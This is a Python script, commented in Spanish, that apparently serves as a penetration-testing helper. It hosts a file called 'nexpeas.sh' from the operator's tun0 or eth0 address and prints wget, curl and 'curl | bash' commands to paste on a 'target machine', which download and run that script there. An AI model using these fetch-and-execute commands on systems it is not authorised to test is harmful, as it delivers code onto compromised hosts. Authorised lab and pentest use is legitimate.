#!/usr/bin/env python3

import socket
import http.server
import socketserver
import os
import sys
from pathlib import Path
import subprocess

# Colores
CYAN = '\033[0;36m'
MAGENTA = '\033[0;35m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
BOLD = '\033[1m'
NC = '\033[0m'

def get_ip_from_interface():
    """Obtiene la IP de tun0 o eth0"""
    interfaces = ['tun0', 'eth0', 'wlan0', 'ens33', 'ens0', 'enp0s3', 'enp6s0']

    for iface in interfaces:
        try:
            # Usar ip addr show para obtener la IP
            result = subprocess.run(
                ['ip', 'addr', 'show', iface],
                capture_output=True,
                text=True,
                timeout=2
            )
            if result.returncode == 0 and result.stdout:
                # Buscar la IP IPv4
                for line in result.stdout.split('\n'):
                    if 'inet ' in line and 'inet6' not in line:
                        ip = line.strip().split()[1].split('/')[0]
                        return ip, iface
        except (subprocess.TimeoutExpired, Exception):
            continue

    # Fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip, "unknown"
    except:
        return "127.0.0.1", "localhost"

def find_available_port(start_port=8000):
    """Encuentra un puerto disponible comenzando desde start_port"""
    port = start_port
    while port < 9000:
        try:
            with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
                return port
        except OSError:
            port += 1
    return None

def print_banner():
    """Banner"""
    print(f"\n{CYAN}")
    print("   ███╗   ██╗███████╗██╗  ██╗██████╗ ███████╗ █████╗ ███████╗")
    print("   ████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝")
    print("   ██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝█████╗  ███████║███████╗")
    print("   ██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██╔══╝  ██╔══██║╚════██║")
    print("   ██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗██║  ██║███████║")
    print("   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝")
    print(f"{NC}\n")

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
    os.chdir(script_dir)

    # Obtener IP
    ip, interface = get_ip_from_interface()

    # Encontrar puerto disponible
    port = find_available_port(8000)

    if port is None:
        print(f"{RED}[ERROR] No se encontró puerto disponible{NC}")
        sys.exit(1)

    print_banner()

    print(f"{MAGENTA}🚀 NEXPEAS HTTP Server{NC}")
    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}\n")

    print(f"{GREEN}✅ Interfaz:{NC} {interface}")
    print(f"{GREEN}✅ IP:{NC} {ip}")
    print(f"{GREEN}✅ Puerto:{NC} {port}")
    print(f"{GREEN}✅ Directorio:{NC} {os.getcwd()}\n")

    url = f"http://{ip}:{port}/nexpeas.sh"

    print(f"{MAGENTA}🎯 URL:{NC} {BOLD}{url}{NC}\n")

    print(f"{YELLOW}╭─ WGET ────────────────────────────────────────────╮{NC}")
    wget_cmd = f"wget {url} -O nexpeas.sh && chmod +x nexpeas.sh && ./nexpeas.sh"
    print(f"{YELLOW}│{NC} {wget_cmd}")
    print(f"{YELLOW}╰────────────────────────────────────────────────────╯{NC}\n")

    print(f"{YELLOW}╭─ CURL ────────────────────────────────────────────╮{NC}")
    curl_cmd = f"curl {url} -o nexpeas.sh && chmod +x nexpeas.sh && ./nexpeas.sh"
    print(f"{YELLOW}│{NC} {curl_cmd}")
    print(f"{YELLOW}╰────────────────────────────────────────────────────╯{NC}\n")

    print(f"{BOLD}💡 Copia y pega en la máquina target:{NC}")
    print(f"{GREEN}   bash -c 'curl {url} | bash'{NC}\n")

    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
    print(f"{MAGENTA}🔗 Servidor escuchando... Presiona CTRL+C para detener{NC}\n")

    # Iniciar servidor
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            """Personalizar logging"""
            if "GET" in format or "POST" in format:
                print(f"{GREEN}[✓]{NC} {self.client_address[0]:15} - {format%args}")

    try:
        with socketserver.TCPServer(("", port), Handler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Servidor detenido{NC}\n")
        sys.exit(0)

if __name__ == "__main__":
    main()
